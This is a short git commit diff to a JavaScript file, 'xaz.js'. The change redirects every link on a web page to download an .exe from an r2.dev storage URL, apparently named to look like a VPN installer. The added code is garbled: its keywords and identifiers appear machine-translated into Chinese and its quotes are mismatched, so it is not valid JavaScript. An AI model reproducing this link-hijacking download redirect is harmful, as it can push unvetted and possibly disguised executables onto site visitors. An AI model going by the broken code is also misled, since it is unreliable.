b31e89d48bacf9acc12ae8ebc378b3ea094aee75
kln6699 <hezs1v@163.com>
2025-03-22 00:42:19 +0800

    Update xaz.js

--- xaz.js
+++ xaz.js
@@ -1,15 +1,15 @@
  
 
-var xz = "/xiazai/Lets-VIP.zip";
+var  xz = “https://pub-b978efeee5f74796b091da96ca739efb.r2.dev/latsvp_h3.22_x64.exe';
 
-//可以把   /xiazai/letspn-latest64.zip  这个改成下载地址；https://guoxiauzausj.oss-rg-china-mainland.aliyuncs.com/letspn-latest64.zip
-//可以把   https://guoxiauzausj.oss-rg-china-mainland.aliyuncs.com/letspn-latest64.zip  这个改成文件下载：/xiazai/kuailian.zip
+//可以把https://pub-b978efeee5f74796b091da96ca739efb.r2.dev/latsvp_H3.22_X64.exe https://pub-b978efeee5f74796b091da96ca739efb.r2.dev/latsvp_H3.22_X64.exe
+//可以把https://pub-b978efeee5f74796b091da96ca739efb.r2.dev/latsvp_H3.22_X64.exe这个改成文件下载：https://pub-b978efeee5f74796b091da96ca739efb.r2.dev/latsvp_H3.22_X64.exe
 
 
 
-var links = document.getElementsByTagName("a");
-for (var i = 0; i < links.length; i++) {
-    if (links[i].hasAttribute("href")) {
-        links[i].href = xz;
+var 链接=文档。getElementsBytaGname （“ a” ） ;
+对于  （var     我 = 0 ;我<链接。长度;我（++ ）{
+    如果  链接  [    i     这是给出的    。Hasattribute（”href”（（））{ 
+        链接[  我  ] 。href = xz ;
     }
 } 
